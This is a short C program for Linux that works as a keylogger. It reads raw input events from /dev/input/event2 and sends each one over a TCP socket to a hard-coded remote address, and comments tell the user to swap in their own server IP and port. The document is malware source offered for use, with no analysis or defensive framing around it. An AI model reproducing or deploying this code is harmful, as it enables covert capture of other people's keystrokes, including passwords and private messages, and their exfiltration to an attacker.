#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <fcntl.h>
#include <linux/input.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>


int main(){
    const char *my_key = "/dev/input/event2";
    struct sockaddr_in server_info;
    int server_socket = socket(AF_INET, SOCK_STREAM, 0);
    socklen_t len = sizeof(server_info);

    server_info.sin_addr.s_addr = inet_addr("192.168.0.5"); // replace with the server IP.
    server_info.sin_port = ntohs(9001); // Replace with a suitable ports.
    server_info.sin_family = AF_INET;
    memset(&server_info.sin_zero, 0, sizeof(server_info.sin_zero));

    if (connect(server_socket, (struct sockaddr *) &server_info, len) < 0){
        perror("connect");
        close(server_socket);
        return 1;
    }


    int fd = open(my_key, O_RDONLY);
    if (fd == -1){
        printf("Unable to open the device file");
    };

    struct input_event ev;


    FILE *logEvent = fopen("./Keylogs.txt","a");
    while(read(fd, &ev, sizeof(struct input_event)) > 0){
        if (send(server_socket, &ev, sizeof(ev), 0) < 0) {
           perror("send failed");
           break;
        }
    }
    fclose(logEvent);
    close(fd);
}
